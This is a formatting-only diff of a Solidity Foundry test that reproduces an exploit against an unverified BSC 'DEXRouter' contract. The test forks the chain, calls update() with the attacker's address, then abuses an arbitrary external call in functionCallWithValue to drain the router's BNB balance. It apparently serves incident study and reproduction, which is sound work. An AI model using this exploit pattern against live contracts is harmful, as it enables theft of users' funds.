@@ -14,57 +14,30 @@ import "./interface.sol";
 // https://twitter.com/DecurityHQ/status/1707851321909428688
 
 interface IDEXRouter {
-    function update(
-        address fcb,
-        address bnb,
-        address busd,
-        address router
-    ) external;
+    function update(address fcb, address bnb, address busd, address router) external;
 
-    function functionCallWithValue(
-        address target,
-        bytes memory data,
-        uint256 value
-    ) external;
+    function functionCallWithValue(address target, bytes memory data, uint256 value) external;
 }
 
 contract ContractTest is Test {
     // Victim unverified contract. Name "DEXRouter" taken from parameter name in "go" function in attack contract
-    IDEXRouter private constant DEXRouter =
-        IDEXRouter(0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7);
+    IDEXRouter private constant DEXRouter = IDEXRouter(0x1f7cF218B46e613D1BA54CaC11dC1b5368d94fb7);
 
     function setUp() public {
-        vm.createSelectFork("bsc", 32161325);
+        vm.createSelectFork("bsc", 32_161_325);
         vm.label(address(DEXRouter), "DEXRouter");
     }
 
     function testExploit() public {
         deal(address(this), 0 ether);
-        emit log_named_decimal_uint(
-            "Attacker BNB balance before exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker BNB balance before exploit", address(this).balance, 18);
         // DEXRouter will call back to function with selector "0xe44a73b7". Look at fallback function
-        DEXRouter.update(
-            address(this),
-            address(this),
-            address(this),
-            address(this)
-        );
+        DEXRouter.update(address(this), address(this), address(this), address(this));
 
         // Arbitrary external call vulnerability here. DEXRouter will call back "a" payable function and next transfer BNB to this contract
-        DEXRouter.functionCallWithValue(
-            address(this),
-            abi.encodePacked(this.a.selector),
-            address(DEXRouter).balance
-        );
+        DEXRouter.functionCallWithValue(address(this), abi.encodePacked(this.a.selector), address(DEXRouter).balance);
 
-        emit log_named_decimal_uint(
-            "Attacker BNB balance after exploit",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("Attacker BNB balance after exploit", address(this).balance, 18);
     }
 
     function a() external payable returns (bool) {
